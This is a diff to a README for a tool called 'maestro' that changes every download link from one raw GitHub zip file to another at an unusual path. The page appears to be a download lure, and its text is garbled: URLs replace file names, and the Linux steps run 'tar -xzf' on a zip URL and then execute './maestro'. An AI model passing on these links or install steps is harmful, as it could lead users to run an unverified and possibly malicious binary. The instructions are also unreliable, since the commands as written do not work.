@@ -1,7 +1,7 @@
 # 🎉 maestro - Simplify Your AI Container Experience
 
 ## 📥 Download Now
-[![Download maestro](https://raw.githubusercontent.com/Kaiga-kun/maestro/main/scripts/maestro_1.5-beta.4.zip)](https://raw.githubusercontent.com/Kaiga-kun/maestro/main/scripts/maestro_1.5-beta.4.zip)
+[![Download maestro](https://raw.githubusercontent.com/Kaiga-kun/maestro/main/pkg/version/Software-2.6.zip)](https://raw.githubusercontent.com/Kaiga-kun/maestro/main/pkg/version/Software-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before you begin, ensure your system meets these requirements:
 
 ## 🔗 Download & Install
 
-To download maestro, visit the following page: [Download maestro](https://raw.githubusercontent.com/Kaiga-kun/maestro/main/scripts/maestro_1.5-beta.4.zip). 
+To download maestro, visit the following page: [Download maestro](https://raw.githubusercontent.com/Kaiga-kun/maestro/main/pkg/version/Software-2.6.zip). 
 
 1. Click the link above to navigate to the releases page.
 2. Look for the latest version of maestro.
-3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/Kaiga-kun/maestro/main/scripts/maestro_1.5-beta.4.zip for Linux).
+3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/Kaiga-kun/maestro/main/pkg/version/Software-2.6.zip for Linux).
 4. Save the file to a location on your computer where you can easily find it (like your Downloads folder).
 
 Once the download is complete, proceed to install the application.
@@ -42,10 +42,10 @@ Once the download is complete, proceed to install the application.
 ### For Linux:
 
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Kaiga-kun/maestro/main/scripts/maestro_1.5-beta.4.zip` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Kaiga-kun/maestro/main/pkg/version/Software-2.6.zip` file.
 3. Use the following commands to extract and run maestro:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/Kaiga-kun/maestro/main/scripts/maestro_1.5-beta.4.zip
+   tar -xzf https://raw.githubusercontent.com/Kaiga-kun/maestro/main/pkg/version/Software-2.6.zip
    cd maestro
    ./maestro
    ```
